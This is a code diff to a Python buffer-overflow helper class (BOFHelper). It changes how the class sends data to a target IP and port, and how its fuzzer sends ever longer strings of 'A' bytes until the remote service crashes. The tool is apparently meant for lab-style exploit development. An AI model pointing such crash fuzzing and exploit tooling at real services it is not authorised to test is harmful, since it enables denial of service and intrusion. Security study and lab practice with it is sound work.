@@ -124,7 +124,6 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
         s.settimeout(self._timeout)
         try:
             s.connect((self._ip, self._port))
-            s.recv(1024)
             if buffer:
                 # think of a good way to handle this
                 self._process_header({"payload_len": str(len(buffer) + len(self._prefix) + len(self._suffix))})
@@ -136,6 +135,12 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
             if trial < 5:
                 return self.send_data(buffer, trial + 1)
             return BOFErrorConnectionTimeout
+        try:
+            res = s.recv(1024).decode()
+            self.debug_log(res)
+        except ConnectionResetError:
+            return BOFErrorConnectionTimeout
+
         s.close()
         time.sleep(1)
         return BOFErrorSuccess
@@ -149,34 +154,32 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
     # @result         @current if succeeded; BOFErrorConnectionRefused if failed to connect.
 
     def _get_byte_for_overflow(self, current: int = 0) -> int:
-        # Check if service has crashed
-        error = self.send_data(b"", 5)
+        self.debug_log("Fuzzing with %s bytes" % current)
 
-        # Service didn't crash -> keep fuzzing
-        if error == BOFErrorSuccess:
-            # Increment @current by self._inc
-            current += self._inc
-            self.debug_log("Fuzzing with %s bytes" % current)
-
-            # No need to test for timeout
-            if self.send_data(b"A" * current, 5) == BOFErrorConnectionRefused:
-                self.err_log("Data failed to send! (current: %d)" % current)
-                return BOFErrorConnectionRefused
-
-            # Run again with updated @current
-            return self._get_byte_for_overflow(current)
+        # No need to test for timeout
+        error = self.send_data(b"A" * current, 5)
 
         # Connection refused. Bye!
-        elif error == BOFErrorConnectionRefused:
+        if error == BOFErrorConnectionRefused:
+            self.err_log("Connection refused! (current: %d)" % current)
             return BOFErrorConnectionRefused
 
         # Service crashed -> print and proceed
-        self.success_log("Service crashed at %s bytes!" % current)
-        self.prompt_restart()
+        elif error == BOFErrorConnectionTimeout:
+            if current == 0:
+                self.err_log("Service is not open!")
+                return BOFErrorConnectionRefused
 
-        # high = @current (as it has successfully caused overflow)
-        # low = previous @current (i.e. current - self._inc)
-        return current
+            self.success_log("Service crashed at %s bytes!" % current)
+            self.prompt_restart()
+
+            # high = @current (as it has successfully caused overflow)
+            # low = previous @current (i.e. current - self._inc)
+            return current
+
+        # Service didn't crash -> increment @current by self._inc
+        current += self._inc
+        return self._get_byte_for_overflow(current)
 
     # @function _send_unique_pattern
     # @abstract Private function to send a unique pattern to the service with a given length.
